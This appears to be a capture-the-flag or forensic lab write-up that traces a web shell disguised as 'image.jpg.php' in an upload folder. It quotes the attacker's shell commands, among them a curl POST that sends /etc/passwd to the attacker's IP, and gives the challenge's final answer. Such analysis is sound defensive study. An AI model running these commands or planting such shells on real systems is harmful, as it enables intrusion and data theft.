# Finding 6 - Targeted Exfiltration File

#### Evidence Observed

During HTTP traffic analysis, the attacker accessed:

```
GET /reviews/uploads/image.jpg.php HTTP/1.1
```

**Frame:** 138\
**Source:** `117.11.88.124`\
**Destination:** `24.49.63.79`\
**Protocol:** HTTP

This request is suspicious because:

* The file is located inside an upload directory:

```
/reviews/uploads/
```

* The file extension is:

```
image.jpg.php
```

This is a common web shell technique where an attacker disguises a PHP script as an image file to bypass upload restrictions.

***

### Web Shell Confirmation

The later TCP stream on port **8080** confirms successful command execution.

The attacker obtained a shell:

```
/bin/sh: 0: can't access tty; job control turned off$
```

Running:

```
whoami
```

returned:

```
www-data
```

Meaning the attacker gained remote command execution under the web server account.

The current directory:

```
pwd/var/www/html/reviews/uploads
```

matches the previously accessed location:

```
/reviews/uploads/image.jpg.php
```

This confirms that `image.jpg.php` was the malicious uploaded file used for persistence/control.

<figure><img src="../.gitbook/assets/fig 6.2.png" alt=""><figcaption></figcaption></figure>

***

### Exfiltration Attempt

The attacker executed:

```
cat /etc/passwd
```

Output:

```
root:x:0:0:root:/root:/bin/bash...ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash
```

This indicates the attacker was enumerating local user accounts.

Then:

```
curl -X POST -d /etc/passwd http://117.11.88.124:443/
```

was executed.

This command attempted to send the contents of:

```
/etc/passwd
```

to the attacker's server:

```
117.11.88.124
```

over HTTP.

<figure><img src="../.gitbook/assets/fig 6..3.png" alt=""><figcaption></figcaption></figure>

***

## Final Answer

**The file targeted for exfiltration was:**

```
/etc/passwd
```

#### Supporting Evidence

<table data-search="false"><thead><tr><th>Evidence</th><th>Value</th></tr></thead><tbody><tr><td>Malicious file</td><td><code>/reviews/uploads/image.jpg.php</code></td></tr><tr><td>Purpose</td><td>Web shell / remote command execution</td></tr><tr><td>Attacker account</td><td><code>www-data</code></td></tr><tr><td>Working directory</td><td><code>/var/www/html/reviews/uploads</code></td></tr><tr><td>Exfiltrated file</td><td><code>/etc/passwd</code></td></tr><tr><td>Exfiltration method</td><td>HTTP POST using curl</td></tr><tr><td>Destination</td><td><code>117.11.88.124:443</code></td></tr><tr><td></td><td></td></tr></tbody></table>
